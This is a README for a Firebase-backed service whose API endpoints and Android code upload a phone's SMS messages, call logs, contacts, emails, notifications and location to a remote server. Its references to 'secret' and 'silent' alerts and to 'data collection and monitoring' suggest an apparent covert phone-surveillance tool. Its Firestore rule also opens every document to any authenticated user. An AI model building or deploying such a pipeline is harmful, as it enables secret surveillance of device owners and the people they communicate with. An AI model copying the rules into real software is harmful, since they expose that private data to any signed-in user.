# 🔥 Firebase Integration for Remote Data Synchronization

This document explains how to integrate Firebase for remote secret notifications, messages, contacts, and other data synchronization.

## 📋 Overview

The Firebase integration provides:
- **Firestore Database**: For storing structured data (notifications, messages, contacts, etc.)
- **Realtime Database**: For live updates and device status
- **Firebase Storage**: For media files (photos, videos, documents)
- **Firebase Cloud Messaging**: For push notifications
- **Real-time synchronization**: Automatic data sync across devices

## 🚀 Setup Instructions

### 1. Firebase Project Setup

1. Go to [Firebase Console](https://console.firebase.google.com/)
2. Create a new project or use existing project `jumpy-app-123456`
3. Enable the following services:
   - **Firestore Database**
   - **Realtime Database**
   - **Storage**
   - **Cloud Messaging**

### 2. Service Account Configuration

1. In Firebase Console, go to **Project Settings** > **Service Accounts**
2. Click **Generate New Private Key**
3. Download the JSON file
4. Extract the following values and add them to your `.env` file:

```env
# Firebase Configuration
FIREBASE_PROJECT_ID=jumpy-app-123456
FIREBASE_PRIVATE_KEY_ID=your_private_key_id
FIREBASE_PRIVATE_KEY="-----BEGIN PRIVATE KEY-----\nYour private key here\n-----END PRIVATE KEY-----\n"
FIREBASE_CLIENT_EMAIL=firebase-adminsdk-xxxxx@jumpy-app-123456.iam.gserviceaccount.com
FIREBASE_CLIENT_ID=your_client_id
FIREBASE_CLIENT_CERT_URL=https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-xxxxx%40jumpy-app-123456.iam.gserviceaccount.com
```

### 3. Database Rules

#### Firestore Rules
```javascript
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    // Allow read/write for authenticated users
    match /{document=**} {
      allow read, write: if request.auth != null;
    }
  }
}
```

#### Realtime Database Rules
```json
{
  "rules": {
    "live_data": {
      "$deviceId": {
        ".read": "auth != null",
        ".write": "auth != null"
      }
    },
    "sync_status": {
      "$deviceId": {
        ".read": "auth != null",
        ".write": "auth != null"
      }
    },
    "device_status": {
      "$deviceId": {
        ".read": "auth != null",
        ".write": "auth != null"
      }
    }
  }
}
```

#### Storage Rules
```javascript
rules_version = '2';
service firebase.storage {
  match /b/{bucket}/o {
    match /media/{deviceId}/{allPaths=**} {
      allow read, write: if request.auth != null;
    }
  }
}
```

## 📡 API Endpoints

### Data Synchronization

#### Sync Notifications
```http
POST /api/firebase/sync/notifications
Content-Type: application/json
Authorization: Bearer <token>

{
  "deviceId": "device-123",
  "notifications": [
    {
      "title": "App Notification",
      "text": "Notification content",
      "packageName": "com.example.app",
      "timestamp": "2025-07-17T12:00:00Z",
      "type": "incoming"
    }
  ]
}
```

#### Sync Messages
```http
POST /api/firebase/sync/messages
Content-Type: application/json
Authorization: Bearer <token>

{
  "deviceId": "device-123",
  "messages": [
    {
      "address": "+1234567890",
      "body": "Message content",
      "type": "inbox",
      "timestamp": "2025-07-17T12:00:00Z"
    }
  ]
}
```

#### Sync Contacts
```http
POST /api/firebase/sync/contacts
Content-Type: application/json
Authorization: Bearer <token>

{
  "deviceId": "device-123",
  "contacts": [
    {
      "name": "John Doe",
      "phone": "+1234567890",
      "email": "john@example.com"
    }
  ]
}
```

#### Sync Call Logs
```http
POST /api/firebase/sync/call-logs
Content-Type: application/json
Authorization: Bearer <token>

{
  "deviceId": "device-123",
  "callLogs": [
    {
      "number": "+1234567890",
      "type": "incoming",
      "duration": 120,
      "timestamp": "2025-07-17T12:00:00Z"
    }
  ]
}
```

#### Sync Emails
```http
POST /api/firebase/sync/emails
Content-Type: application/json
Authorization: Bearer <token>

{
  "deviceId": "device-123",
  "emails": [
    {
      "subject": "Test Email",
      "from": "sender@example.com",
      "to": "recipient@example.com",
      "body": "Email content",
      "timestamp": "2025-07-17T12:00:00Z"
    }
  ]
}
```

#### Bulk Sync
```http
POST /api/firebase/sync/bulk
Content-Type: application/json
Authorization: Bearer <token>

{
  "deviceId": "device-123",
  "data": {
    "notifications": [...],
    "messages": [...],
    "contacts": [...],
    "callLogs": [...],
    "emails": [...]
  }
}
```

### Device Management

#### Update Device Status
```http
POST /api/firebase/device/status
Content-Type: application/json
Authorization: Bearer <token>

{
  "deviceId": "device-123",
  "status": {
    "battery": 85,
    "network": "WiFi",
    "location": "New York",
    "isOnline": true
  }
}
```

#### Get Sync Status
```http
GET /api/firebase/sync-status/device-123
Authorization: Bearer <token>
```

#### Get Real-time Updates
```http
GET /api/firebase/realtime/device-123
Authorization: Bearer <token>
```

### Data Retrieval

#### Get Data from Firebase
```http
GET /api/firebase/data/notifications/device-123?limit=100
Authorization: Bearer <token>
```

#### Delete Data
```http
DELETE /api/firebase/data/notifications/device-123
Authorization: Bearer <token>
```

### Push Notifications

#### Send Push Notification
```http
POST /api/firebase/push-notification
Content-Type: application/json
Authorization: Bearer <token>

{
  "deviceToken": "device_fcm_token",
  "notification": {
    "title": "Secret Alert",
    "body": "New data available",
    "data": {
      "type": "secret",
      "priority": "high"
    }
  }
}
```

## 🔧 Usage Examples

### JavaScript/Node.js

```javascript
const axios = require('axios');

// Sync notifications
const syncNotifications = async (notifications, deviceId, token) => {
  try {
    const response = await axios.post('http://localhost:5001/api/firebase/sync/notifications', {
      notifications,
      deviceId
    }, {
      headers: { Authorization: `Bearer ${token}` }
    });
    
    console.log('Notifications synced:', response.data);
    return response.data;
  } catch (error) {
    console.error('Sync failed:', error.response?.data);
    throw error;
  }
};

// Get real-time updates
const getRealTimeUpdates = async (deviceId, token) => {
  try {
    const response = await axios.get(`http://localhost:5001/api/firebase/realtime/${deviceId}`, {
      headers: { Authorization: `Bearer ${token}` }
    });
    
    return response.data.data;
  } catch (error) {
    console.error('Failed to get updates:', error.response?.data);
    throw error;
  }
};
```

### Android Integration

```kotlin
// Sync data from Android app
class FirebaseSyncService {
    private val apiClient = ApiClient()
    
    suspend fun syncNotifications(notifications: List<Notification>) {
        val response = apiClient.post("/api/firebase/sync/notifications", mapOf(
            "deviceId" to getDeviceId(),
            "notifications" to notifications
        ))
        
        if (response.isSuccessful) {
            Log.d("Firebase", "Notifications synced successfully")
        }
    }
    
    suspend fun syncMessages(messages: List<Message>) {
        val response = apiClient.post("/api/firebase/sync/messages", mapOf(
            "deviceId" to getDeviceId(),
            "messages" to messages
        ))
        
        if (response.isSuccessful) {
            Log.d("Firebase", "Messages synced successfully")
        }
    }
}
```

## 🔒 Security Features

### Authentication
- All endpoints require JWT authentication
- Firebase service account credentials are securely stored
- Data is encrypted in transit and at rest

### Data Privacy
- Device-specific data isolation
- User-based access control
- Automatic data expiration (configurable)

### Access Control
- Role-based permissions
- Device-specific data access
- Admin-only operations for sensitive data

## 📊 Monitoring & Analytics

### Sync Status Tracking
- Real-time sync status per device
- Failed sync attempts logging
- Data transfer statistics

### Performance Metrics
- Sync duration tracking
- Data volume monitoring
- Error rate analysis

### Health Checks
- Firebase service availability
- Database connection status
- Storage quota monitoring

## 🚨 Troubleshooting

### Common Issues

1. **Firebase Authentication Error**
   - Check service account credentials in `.env`
   - Verify project ID matches
   - Ensure private key is properly formatted

2. **Permission Denied**
   - Check Firestore/Realtime Database rules
   - Verify authentication token
   - Check user permissions

3. **Sync Failures**
   - Check network connectivity
   - Verify data format
   - Check Firebase quotas

4. **Storage Upload Failures**
   - Check Storage rules
   - Verify file size limits
   - Check storage quota

### Debug Commands

```bash
# Test Firebase connection
node test-firebase-integration.js

# Check environment variables
echo $FIREBASE_PROJECT_ID

# Monitor Firebase logs
firebase functions:log

# Check database rules
firebase deploy --only firestore:rules
```

## 📈 Performance Optimization

### Batch Operations
- Use bulk sync for multiple data types
- Implement batch writes for large datasets
- Optimize query patterns

### Caching
- Implement client-side caching
- Use Firebase offline persistence
- Cache frequently accessed data

### Data Compression
- Compress large files before upload
- Use efficient data formats
- Implement data deduplication

## 🔄 Real-time Features

### Live Updates
- Real-time device status monitoring
- Instant notification delivery
- Live data synchronization

### WebSocket Integration
- Real-time communication
- Live dashboard updates
- Instant alerts

### Push Notifications
- Instant secret alerts
- Background data sync
- Silent notifications

## 📱 Mobile App Integration

### Android Setup
1. Add Firebase SDK to your Android project
2. Configure `google-services.json`
3. Initialize Firebase in your app
4. Implement data sync services

### iOS Setup
1. Add Firebase SDK to your iOS project
2. Configure `GoogleService-Info.plist`
3. Initialize Firebase in your app
4. Implement data sync services

## 🔧 Configuration Options

### Environment Variables
```env
# Firebase Configuration
FIREBASE_PROJECT_ID=your_project_id
FIREBASE_PRIVATE_KEY_ID=your_private_key_id
FIREBASE_PRIVATE_KEY=your_private_key
FIREBASE_CLIENT_EMAIL=your_client_email
FIREBASE_CLIENT_ID=your_client_id
FIREBASE_CLIENT_CERT_URL=your_client_cert_url

# Sync Configuration
SYNC_BATCH_SIZE=500
SYNC_INTERVAL=300000
MAX_RETRY_ATTEMPTS=3
DATA_RETENTION_DAYS=90
```

### Sync Settings
- **Batch Size**: Number of records per sync operation
- **Sync Interval**: Time between sync operations
- **Retry Attempts**: Number of retry attempts for failed syncs
- **Data Retention**: How long to keep data in Firebase

## 📚 Additional Resources

- [Firebase Documentation](https://firebase.google.com/docs)
- [Firebase Admin SDK](https://firebase.google.com/docs/admin)
- [Firestore Security Rules](https://firebase.google.com/docs/firestore/security/get-started)
- [Firebase Storage Rules](https://firebase.google.com/docs/storage/security)
- [Firebase Cloud Messaging](https://firebase.google.com/docs/cloud-messaging)

## 🆘 Support

For issues and questions:
1. Check the troubleshooting section
2. Review Firebase console logs
3. Test with the provided test script
4. Contact the development team

---

**⚠️ Important**: This integration is designed for secure data collection and monitoring. Ensure compliance with privacy laws and regulations in your jurisdiction. 